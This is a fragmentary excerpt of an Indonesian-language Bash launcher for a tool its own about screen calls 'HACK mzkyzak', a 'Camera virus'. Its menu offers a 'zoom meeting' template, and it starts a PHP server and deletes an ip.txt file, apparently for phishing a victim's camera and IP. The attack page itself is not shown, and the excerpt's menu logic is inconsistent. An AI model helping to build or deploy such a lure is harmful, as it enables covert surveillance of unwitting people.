...
trap "echo -e '\n${success}terima kasih telah memakai tools ini" 2
...
if [ `command -v apt` ]; then
    ...
    echo -e "${error}tidak supported package manager kosong! Install packages manually!\007\n"
    exit 1
fi
else
if [ `command -v apt` ]; then
    ...
    echo -e "${error}tidak supported package manager found! Install packages manually!\007\n"
    exit 1
fi
fi
...
echo -e "$logo"
sleep 1
echo -e "${ask}menu utama:
${red}[${white}1${red}] ${cyan}zoom meeting
${red}[${white}2${red}] ${cyan}Tentang
${red}[${white}0${red}] ${cyan}keluar${blue}
"
...
read option
# Select template
    if echo $option | grep -q "12"; then
        dir="jio"
        break
    elif echo $option | grep -q "22"; then
        dir="fest"
        ...
        clear
        echo -e "$logo"
        echo -e "$red[ToolName]  ${cyan}  :[HACK mzkyzak]
$red[Version]      ${cyan} :[1.1]
$red[Deksripsi]    ${cyan} :[Camera virus]
$red[BY]           ${cyan} :[mzkyzak]
$red[Pemilik code] ${cyan} :XPHANTOM 
$red[Github]       ${cyan} :[https://github.com/mzkyzak] 
$red[Telegarm]     ${cyan} :[https://t.me/mzkyzak]"
printf "${cyan}muzaky${nc}@${cyan}mzkyzak ${red}$ ${nc}"
read about
...
if echo "$status" | grep -q "404"; then
    ...
    echo -e "${success}PHP start succesfully!\n"
fi
sleep 1
rm -rf ip.txt
